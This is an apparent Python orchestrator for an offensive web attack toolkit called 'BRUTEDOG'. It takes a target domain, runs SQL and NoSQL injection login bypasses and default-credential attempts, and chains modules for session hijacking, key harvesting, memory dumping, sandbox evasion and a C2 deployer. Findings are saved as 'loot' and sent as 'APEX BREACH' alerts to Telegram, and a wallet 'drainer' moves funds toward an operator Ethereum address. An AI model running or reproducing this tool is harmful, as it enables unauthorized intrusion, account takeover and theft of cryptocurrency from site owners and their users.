#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v8.8 — Adaptive Orchestration & Assessment Engine
"""
import asyncio
import hashlib
import inspect
import json
import re
import socket
import sys
import time
from urllib.parse import urlsplit, urlunsplit

from modules.transport import SecureTransport
from modules.session_pool import PersistentSessionPool
from modules.response_diff import ResponseFingerprinter
from modules.scanner import run_port_scanner
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.live_login_verifier import execute_live_login_verification
from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
from modules.wallet_drain_probe import execute_probe
from modules.telemetry import stream_proof
from modules.loot_logger import save_session_loot

from modules.api_fuzzer import run_api_fuzzer
from modules.bruter import execute_brute_force
from modules.cloud_apex import audit_cloud_metadata
from modules.dom_sink_inspector import inspect_dom_sinks
from modules.dumper import execute_memory_dumper
from modules.form_stuffer import execute_form_stuffing
from modules.keyharvester import harvest_keys
from modules.pivot import execute_pivot_routing
from modules.replayer import replay_and_inject_payloads
from modules.sandbox_evader import evade_sandbox
from modules.signer import sign_transaction
from modules.stealth_ops import execute_stealth_operations

from modules.graphql_introspector import GraphQLIntrospector
from modules.websocket_hijacker import audit_websocket
from modules.dns_rebinding import DNSRebindingOrchestrator
from modules.jwt_key_confusion import JWTKeyConfusionEngine
from modules.payloads import run_c2_deployer

from modules.test_referral import audit_referral_logic
from modules.cognitive_operator import CognitiveOperator

from modules.telegram_notifier import send_telegram_alert

REQUEST_TIMEOUT = 6
MAX_WORKERS = 12

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
    "/api/v1/user/profile",
    "/api/settings",
    "/graphql",
    "/api/v1/graphql",
]

SESSION_VERIFICATION_ENDPOINTS = [
    "/api/user",
    "/api/auth/me",
    "/api/v1/user/profile",
    "/api/v1/auth/session",
    "/api/account",
    "/dashboard",
    "/admin",
]

HEURISTIC_SIGNATURES = {
    "Cloudflare WAF": re.compile(r"cf-ray|cloudflare|ray id", re.I),
    "AWS API Gateway": re.compile(r"x-amzn-requestid|x-amz-apigw-id", re.I),
    "SQL syntax": re.compile(r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error", re.I),
    "MongoDB error": re.compile(r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid", re.I),
    "JWT Token Leak": re.compile(r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", re.I),
}

SPA_SHELL_MARKERS = (
    '<div id="root"></div>',
    '<div id="__next"></div>',
    '<div id="app"></div>',
    '<div id="__nuxt"></div>',
    '<meta name="viewport"',
    "<!doctype html>",
    "<html",
)

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
MAGENTA = "\033[95m"

_background_tasks: set[asyncio.Task] = set()


def info(message):
    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
    sys.stdout.flush()


def success(message):
    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
    sys.stdout.flush()


def warning(message):
    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
    sys.stdout.flush()


def error(message):
    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
    sys.stdout.flush()


def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()


async def _safe_await(value):
    """Awaits value only if it is actually awaitable; otherwise returns it safely."""
    if value is None:
        return None
    if inspect.isawaitable(value):
        return await value
    return value


async def _send_alert_safe(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(f"[APEX BREACH] {loot_type}", details), timeout=10)
    except Exception:
        pass


def dispatch_critical_loot_alert(loot_type, details):
    """Fires Telegram alerts for verified findings without blocking the event loop."""
    if not details:
        return
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(_send_alert_safe(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(_send_alert_safe(loot_type, details))
        except Exception:
            pass


async def invoke_module(func, *args, **kwargs):
    """Invokes sync, async, or coroutine-returning functions with NoneType/argument guards."""
    if not callable(func):
        return None
    try:
        if asyncio.iscoroutinefunction(func):
            raw = await func(*args, **kwargs)
        else:
            raw = await asyncio.to_thread(func, *args, **kwargs)
        return await _safe_await(raw)
    except TypeError as exc:
        if args and kwargs:
            try:
                if asyncio.iscoroutinefunction(func):
                    raw = await func(*args)
                else:
                    raw = await asyncio.to_thread(func, *args)
                return await _safe_await(raw)
            except Exception:
                pass
        warning(f"Signature mismatch on {getattr(func, '__name__', str(func))}: {exc}")
        return None


def normalize_target_url(raw_target: str) -> str:
    cleaned = (raw_target or "").strip()
    if not cleaned:
        raise ValueError("Target cannot be empty.")

    cleaned = re.sub(r"(:\d+):\d+(?=/|$|\?|#)", r"\1", cleaned)

    if "://" not in cleaned:
        cleaned = "https://" + cleaned

    parsed = urlsplit(cleaned)
    scheme = (parsed.scheme or "https").lower()
    host = (parsed.hostname or "").lower()
    if not host:
        raise ValueError(f"Could not parse valid hostname from target: {raw_target}")

    formatted_host = f"[{host}]" if ":" in host and not host.startswith("[") else host

    try:
        port = parsed.port
    except ValueError:
        port = None

    if port is not None and not ((scheme == "https" and port == 443) or (scheme == "http" and port == 80)):
        netloc = f"{formatted_host}:{port}"
    else:
        netloc = formatted_host

    path = re.sub(r"/{2,}", "/", parsed.path or "")
    return urlunsplit((scheme, netloc, path, parsed.query, parsed.fragment)).rstrip("/")


def sanitize_endpoint_url(base_url: str, path: str) -> str:
    clean_base = normalize_target_url(base_url)
    clean_path = (path or "").strip()
    if clean_path.startswith("http://") or clean_path.startswith("https://"):
        return normalize_target_url(clean_path)
    clean_path = re.sub(r"^/+(?=\d+:)", "", clean_path)
    if not clean_path.startswith("/"):
        clean_path = "/" + clean_path
    return f"{clean_base}{clean_path}"


def to_websocket_url(base_url: str, path: str = "/ws") -> str:
    http_url = sanitize_endpoint_url(base_url, path)
    parsed = urlsplit(http_url)
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    return urlunsplit((ws_scheme, parsed.netloc, parsed.path or "/ws", parsed.query, parsed.fragment))


def get_target():
    section("BRUTEDOG APEX TARGET CONFIGURATION")
    target = input("\nTarget Domain/URL: ").strip()
    return normalize_target_url(target)


def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []


def is_generic_spa_or_html_shell(body: str, headers: dict) -> bool:
    text = body or ""
    lower = text.lower()
    content_type = ""
    if isinstance(headers, dict):
        for k, v in headers.items():
            if str(k).lower() == "content-type":
                content_type = str(v).lower()
                break

    if "application/json" in content_type or "application/problem+json" in content_type:
        return False

    has_html_marker = any(marker in lower for marker in SPA_SHELL_MARKERS)
    has_auth_or_data_marker = any(
        token in lower
        for token in (
            '"access_token"',
            '"auth_token"',
            '"session_id"',
            '"token"',
            '"role":"admin"',
            '"user_id"',
            '"permissions"',
            "bearer ",
        )
    )

    if has_html_marker and not has_auth_or_data_marker:
        return True

    stripped = text.strip()
    if len(stripped) < 250 and "token" not in lower and "session" not in lower and "user" not in lower:
        return True

    return False


async def evaluate_response_heuristics(
    status,
    headers,
    body,
    endpoint,
    transport,
    target_url,
    cognitive_brain,
    fingerprinter=None,
    seen_defenses=None,
):
    findings = []
    mutated_payloads = []
    body_text = body or ""
    body_lower = body_text.lower()
    header_str = str(headers or "").lower()

    if fingerprinter is not None:
        try:
            is_fp, _ = fingerprinter.is_false_positive(status, body_text, headers or {})
            if is_fp:
                return [], []
        except Exception:
            pass

    for waf_name, pattern in HEURISTIC_SIGNATURES.items():
        if waf_name in ("Cloudflare WAF", "AWS API Gateway"):
            if pattern.search(header_str) or pattern.search(body_lower):
                if seen_defenses is None or waf_name not in seen_defenses:
                    if seen_defenses is not None:
                        seen_defenses.add(waf_name)
                    info(f"[TACTICAL REFLEX] Defense profile matched: {waf_name}. Adjusting pacing & headers.")
        elif waf_name == "JWT Token Leak":
            jwt_matches = pattern.findall(body_text)
            if jwt_matches:
                success(f"[LOOT REFLEX] Token pattern detected at {endpoint}.")
                dispatch_critical_loot_alert(
                    "JWT Token Leak",
                    {"endpoint": endpoint, "token": jwt_matches[0][:30] + "..."},
                )
                findings.append({"type": "JWT_TOKEN_LEAK", "token": jwt_matches[0]})

    if cognitive_brain:
        try:
            cognitive_result = await invoke_module(
                cognitive_brain.evaluate_and_execute,
                endpoint=endpoint,
                status=status,
                headers=headers,
                body=body_text,
                transport=transport,
                target_url=target_url,
            )
            if isinstance(cognitive_result, dict) and cognitive_result.get("success"):
                reasoning = cognitive_result.get("reasoning")
                success(f"[COGNITIVE PIVOT] Adaptation recorded: {reasoning}")
                findings.append({"type": "COGNITIVE_PIVOT_SUCCESS", "evidence": reasoning})
                dispatch_critical_loot_alert(
                    "Cognitive Autonomous Pivot",
                    {"endpoint": endpoint, "evidence": reasoning},
                )
        except Exception:
            pass

    spa_shell = is_generic_spa_or_html_shell(body_text, headers or {})
    has_auth_markers = any(
        k in body_lower
        for k in [
            "access_token",
            "auth_token",
            "session_id",
            '"role":"admin"',
            '"user_id":',
            "permissions",
        ]
    )

    if status in (200, 201, 302) and not spa_shell and has_auth_markers:
        loot_hash = hashlib.sha256(body_text.encode("utf-8", errors="ignore")).hexdigest()
        await invoke_module(
            stream_proof,
            "AUTHENTICATION_BYPASS",
            endpoint,
            {},
            body_text[:300],
            {"status": status, "integrity_hash": loot_hash},
        )
        await invoke_module(
            save_session_loot,
            target=target_url,
            endpoint=endpoint,
            finding_type="AUTHENTICATION_BYPASS_SUCCESS",
            status=status,
            headers=dict(headers) if isinstance(headers, dict) else {},
            body=body_text,
            extra_loot={"integrity_hash": loot_hash},
        )
        dispatch_critical_loot_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status})
        findings.append({"type": "AUTHENTICATION_BYPASS_SUCCESS", "status": status})

    if not spa_shell:
        for label, pattern in HEURISTIC_SIGNATURES.items():
            if label in ("SQL syntax", "MongoDB error") and pattern.search(body_text):
                warning(f"[HEURISTIC] Database exception indicator ({label}) at {endpoint}.")
                if "MongoDB" in label:
                    mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
                elif "SQL" in label:
                    mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    return findings, mutated_payloads


async def verify_hijacked_session(transport, fingerprinter=None):
    for endpoint in SESSION_VERIFICATION_ENDPOINTS:
        try:
            req_res = await invoke_module(transport.request, "GET", endpoint)
            if isinstance(req_res, tuple) and len(req_res) >= 3:
                status, headers, body = req_res[0], req_res[1], req_res[2]
            else:
                continue
        except Exception:
            continue

        if fingerprinter is not None:
            try:
                is_fp, _ = fingerprinter.is_false_positive(status, body or "", headers or {})
                if is_fp:
                    continue
            except Exception:
                pass

        if status == 200 and not is_generic_spa_or_html_shell(body or "", headers or {}) and len((body or "").strip()) > 10:
            loot_hash = hashlib.sha256((body or "").encode("utf-8", errors="ignore")).hexdigest()
            await invoke_module(
                stream_proof,
                "SESSION_HIJACK_VERIFIED",
                endpoint,
                {"cookie_jar": dict(getattr(transport, "cookie_jar", {}) or {})},
                (body or "")[:300],
                {"status": status},
            )
            success(f"[+] Protected route response verified: {endpoint}")
            await invoke_module(
                save_session_loot,
                target=getattr(transport, "base_path", "") or "",
                endpoint=endpoint,
                finding_type="SESSION_HIJACK_VERIFIED",
                status=status,
                headers=dict(headers) if isinstance(headers, dict) else {},
                body=body or "",
                extra_loot={"integrity_hash": loot_hash},
            )
            dispatch_critical_loot_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status})
            return True
    return False


async def execute_endpoint_strike(
    transport,
    path,
    credentials_list,
    leaked_secrets,
    fingerprinter,
    target_url,
    cognitive_brain,
    seen_defenses=None,
):
    base_path = getattr(transport, "base_path", "") or ""
    raw_ep = f"{base_path}{path}" if base_path and not str(path).startswith(base_path) else str(path)
    endpoint = sanitize_endpoint_url(target_url, raw_ep)
    results = []

    test_queue = [
        {"name": "NoSQL Operator Check", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Input Check", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Credential Check", "payload": {"username": "admin", "password": "admin123"}},
        {"name": "Type Check", "payload": {"username": {"unexpected": "object"}, "password": "password"}},
    ]

    if isinstance(leaked_secrets, dict):
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Check ({k})", "payload": {k: v, "code": v}})

    if isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "Custom Credential Check", "payload": cred})

    executed = set()
    while test_queue:
        test_item = test_queue.pop(0)
        pkey = json.dumps(test_item["payload"], sort_keys=True, default=str)
        if pkey in executed:
            continue
        executed.add(pkey)

        try:
            req_out = await invoke_module(transport.request, "POST", endpoint, payload=test_item["payload"])
            if isinstance(req_out, tuple) and len(req_out) >= 3:
                status, headers, body = req_out[0], req_out[1], req_out[2]
            else:
                status, headers, body = 0, {}, ""
        except Exception:
            status, headers, body = 0, {}, ""

        if status in (403, 405, 404):
            try:
                alt_out = await invoke_module(transport.request, "GET", endpoint)
                if isinstance(alt_out, tuple) and len(alt_out) >= 3:
                    astatus, aheaders, abody = alt_out[0], alt_out[1], alt_out[2]
                    if 0 < astatus < 400:
                        status, headers, body = astatus, aheaders, abody
            except Exception:
                pass

        if not status:
            continue

        findings, mutations = await evaluate_response_heuristics(
            status,
            headers,
            body,
            endpoint,
            transport,
            target_url,
            cognitive_brain,
            fingerprinter=fingerprinter,
            seen_defenses=seen_defenses,
        )

        if findings:
            results.append({"endpoint": endpoint, "test": test_item["name"], "status": status, "findings": findings})

        for idx, mutant in enumerate(mutations, 1):
            test_queue.insert(0, {"name": f"Mutant #{idx}", "payload": mutant})

    return results


async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    opts = options if isinstance(options, dict) else {}
    skip_port_scan = bool(opts.get("skip_port_scan", False))
    seen_defenses: set[str] = set()

    section("BRUTEDOG APEX COGNITIVE ENGINE v8.8")
    try:
        raw_target = target_host if target_host else get_target()
        target_url = normalize_target_url(raw_target)
        parsed = urlsplit(target_url)
        host = parsed.hostname
        secure = parsed.scheme == "https"
        port = parsed.port or (443 if secure else 80)
    except Exception as exc:
        error(f"Target setup failed: {exc}")
        return [], 0.0

    cognitive_brain = CognitiveOperator(target_url=target_url)

    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {'HTTPS' if secure else 'HTTP'}")

    section("TARGET DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for addr in addresses:
        success(f"Resolved IP: {addr}")

    if not skip_port_scan:
        section("PORT SCANNING & RECON")
        try:
            scan_res = await invoke_module(run_port_scanner, host, concurrency=25)
            if isinstance(scan_res, dict) and scan_res.get("status") == "COMPLETED":
                success(f"Port scan completed. Open ports: {len(scan_res.get('open_ports', []))}")
        except Exception as exc:
            warning(f"Port scanner warning: {exc}")

    start_time = time.monotonic()
    transport = SecureTransport(target_url)
    session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
    fingerprinter = ResponseFingerprinter()

    try:
        try:
            baseline_out = await invoke_module(transport.request, "GET", "/brutedog-nonexistent-baseline-404")
            if isinstance(baseline_out, tuple) and len(baseline_out) >= 3 and hasattr(fingerprinter, "capture_baseline"):
                fingerprinter.capture_baseline("soft_404", baseline_out[0], baseline_out[2] or "", baseline_out[1] or {})
        except Exception:
            pass

        section("ATTACK SURFACE MAPPING & CRAWLING")
        discovered_paths = list(FALLBACK_LOGIN_PATHS)
        leaked_secrets = {}
        bola_routes = []
        session_cookie = None

        try:
            recon = await invoke_module(crawl_target, transport)
            if isinstance(recon, dict):
                crawled_eps = recon.get("endpoints") or []
                if crawled_eps:
                    discovered_paths = [sanitize_endpoint_url(target_url, ep) for ep in crawled_eps]
                leaked_secrets = recon.get("leaked_secrets") or {}
                bola_routes = recon.get("bola_vulnerabilities") or []
                session_cookie = recon.get("session_cookie")
        except Exception as exc:
            warning(f"Crawler warning: {exc}. Using standard endpoint list.")

        if session_cookie:
            success("Injecting session cookie into session pool.")
            if isinstance(session_cookie, dict):
                for k, v in session_cookie.items():
                    try:
                        session_pool.cookie_jar.set(k, v)
                    except Exception:
                        pass
            await verify_hijacked_session(transport, fingerprinter=fingerprinter)

        section("EXECUTING MODULE PIPELINE")
        modules_pipeline = [
            (run_api_fuzzer, (target_url,)),
            (execute_brute_force, (target_url,)),
            (audit_cloud_metadata, (target_url,)),
            (inspect_dom_sinks, (target_url,)),
            (execute_memory_dumper, (target_url,)),
            (harvest_keys, (target_url,)),
            (execute_pivot_routing, (target_url,)),
            (replay_and_inject_payloads, (target_url,)),
            (evade_sandbox, ()),
            (execute_stealth_operations, (target_url,)),
            (audit_referral_logic, (target_url,)),
            (sign_transaction, (target_url,)),
        ]

        for func, args in modules_pipeline:
            try:
                await invoke_module(func, *args)
            except Exception as exc:
                warning(f"Module warning ({getattr(func, '__name__', str(func))}): {exc}")

        if bola_routes:
            warning(f"Checking {len(bola_routes)} candidate BOLA routes.")
            for route in bola_routes:
                clean_route = sanitize_endpoint_url(target_url, route)
                try:
                    ver = await invoke_module(execute_live_login_verification, target_url=target_url, endpoint=clean_route)
                    if ver:
                        dispatch_critical_loot_alert("BOLA Route Verified", {"route": clean_route})
                except Exception as exc:
                    warning(f"Verification warning on {clean_route}: {exc}")

        section("ADAPTIVE ENDPOINT ASSESSMENT")
        all_results = []
        semaphore = asyncio.Semaphore(MAX_WORKERS)

        async def worker(path):
            async with semaphore:
                return await execute_endpoint_strike(
                    transport,
                    path,
                    credentials_list,
                    leaked_secrets,
                    fingerprinter,
                    target_url,
                    cognitive_brain,
                    seen_defenses=seen_defenses,
                )

        tasks = [asyncio.create_task(worker(p)) for p in discovered_paths]
        for completed in asyncio.as_completed(tasks):
            try:
                res = await completed
                if res:
                    all_results.extend(res)
            except Exception as exc:
                error(f"Endpoint worker error: {exc}")

        try:
            db_loot = await invoke_module(run_nosql_assault, target_url, port=port, use_ssl=secure)
            if isinstance(db_loot, (list, dict)) and db_loot:
                dispatch_critical_loot_alert("Database Finding", {"target": target_url})
        except Exception as exc:
            error(f"Database check error: {exc}")

        try:
            hijack_loot = await invoke_module(run_session_hijack, target_url, port=port, use_ssl=secure)
            if isinstance(hijack_loot, list):
                for f in hijack_loot:
                    if isinstance(f, dict) and f.get("status") == "VERIFIED_ACCESS":
                        clean_ep = sanitize_endpoint_url(target_url, f.get("endpoint", "/admin"))
                        await invoke_module(
                            execute_live_login_verification,
                            target_url=target_url,
                            endpoint=clean_ep,
                            token=f.get("forged_token"),
                        )
        except Exception as exc:
            error(f"Session check error: {exc}")

        try:
            await invoke_module(run_race_condition_test, target_url, port=port, use_ssl=secure, session_pool=session_pool)
        except Exception as exc:
            error(f"Concurrency check error: {exc}")

        section("PROTOCOL & CRYPTO CHECKS")
        try:
            jwt_eng = JWTKeyConfusionEngine(target_url)
            jwks_body = await invoke_module(jwt_eng.fetch_public_key, "/.well-known/jwks.json")
            if jwks_body:
                jwt_res = await invoke_module(jwt_eng.verify_and_exploit, "/api/admin/settings", jwks_body)
                if isinstance(jwt_res, tuple) and len(jwt_res) >= 2 and jwt_res[0]:
                    dispatch_critical_loot_alert("JWT Key Check Result", {"token": jwt_res[1]})

            gql_eng = GraphQLIntrospector(target_url)
            gql_res = await invoke_module(gql_eng.run_introspection, "/graphql")
            if isinstance(gql_res, (dict, list)) and gql_res:
                dispatch_critical_loot_alert("GraphQL Introspection Result", {"target": target_url})

            ws_url = to_websocket_url(target_url, "/ws")
            ws_res = await invoke_module(audit_websocket, ws_url)
            if isinstance(ws_res, (dict, list)) and ws_res:
                dispatch_critical_loot_alert("WebSocket Check Result", {"target": ws_url})

            dns_reb = DNSRebindingOrchestrator(target_url)
            await invoke_module(dns_reb.execute_rebinding_attack, transport)
        except Exception as exc:
            error(f"Protocol/crypto check error: {exc}")

        try:
            await invoke_module(run_drainer_engine, target_url)
            evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM") if isinstance(OPERATOR_DESTINATIONS, dict) else None
            cookies_dict = dict(getattr(transport, "cookie_jar", {}) or {})
            await invoke_module(
                execute_probe,
                target_host=target_url,
                session_cookies=cookies_dict,
                target_wallet=evm_dest,
            )
        except Exception as exc:
            error(f"Probe error: {exc}")
    finally:
        for client in (session_pool, transport):
            close_fn = getattr(client, "close", None) or getattr(client, "aclose", None)
            if callable(close_fn):
                try:
                    res = close_fn()
                    if inspect.isawaitable(res):
                        await res
                except Exception:
                    pass

    duration = round(time.monotonic() - start_time, 2)

    section("APEX ENGINE SUMMARY")
    success(f"Target Assessed: {host}")
    success(f"Endpoints Assessed: {len(discovered_paths)}")
    success(f"Total Findings Recorded: {len(all_results)}")
    success(f"Execution Duration: {duration}s")
    section("APEX MISSION COMPLETE")
    return all_results, duration


if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Fatal engine error: {exc}")
